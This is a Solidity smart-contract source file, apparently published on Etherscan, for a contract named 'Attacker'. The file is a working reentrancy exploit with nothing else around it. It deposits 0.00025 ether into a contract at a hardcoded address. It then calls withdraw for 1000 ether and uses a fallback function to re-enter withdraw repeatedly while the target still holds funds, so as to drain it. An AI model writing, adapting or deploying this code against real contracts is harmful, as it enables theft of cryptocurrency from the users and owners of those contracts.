/**
 *Submitted for verification at Etherscan.io on 2023-05-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IVulnerable public vulnerableContract;
    uint256 public withdrawalAmount = 1000 ether;
    uint256 public numWithdrawals = 1;

    constructor() {
        vulnerableContract = IVulnerable(0x8484Ef722627bf18ca5Ae6BcF031c23E6e922B30);
    }

    function attack() public payable {
        require(msg.value == 0.00025 ether, "Invalid amount");

        vulnerableContract.deposit{value: msg.value}();

        for (uint256 i = 0; i < numWithdrawals; i++) {
            vulnerableContract.withdraw(withdrawalAmount);
        }
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= msg.value) {
            vulnerableContract.withdraw(msg.value);
        }
    }

    receive() external payable {}
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}